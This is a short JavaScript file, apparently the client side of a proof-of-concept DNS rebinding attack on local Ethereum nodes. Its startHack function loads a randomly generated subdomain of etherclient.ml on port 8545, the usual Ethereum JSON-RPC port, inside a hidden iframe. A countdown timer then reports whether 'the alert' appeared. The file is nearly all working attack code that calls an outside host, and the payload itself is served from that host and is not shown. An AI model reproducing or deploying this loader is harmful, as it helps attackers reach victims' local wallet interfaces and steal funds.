
var interval;

function makeSub() {
	  var text = "";
	  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

	  for (var i = 0; i < 16; i++)
	    text += possible.charAt(Math.floor(Math.random() * possible.length));

	  return text;
}

function startTimer(duration) {
    var timer = duration, minutes, seconds;
    interval = setInterval(function () {
        minutes = parseInt(timer / 60, 10)
        seconds = parseInt(timer % 60, 10);

        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;

        document.getElementById('timeP').innerHTML="Wait "+minutes+":"+seconds;

        if (--timer < 0) {
            clearInterval(interval);
            document.getElementById('timeP').innerHTML="The alert must have appeared or something went wrong";
        }
    }, 1000);
}

function startHack() {
	var i = document.createElement('iframe');
	i.style.display = 'none';
	i.src = 'http://'+makeSub()+'.etherclient.ml:8545';
	document.body.appendChild(i);

    var timeRe = 80;
    startTimer(timeRe);
};
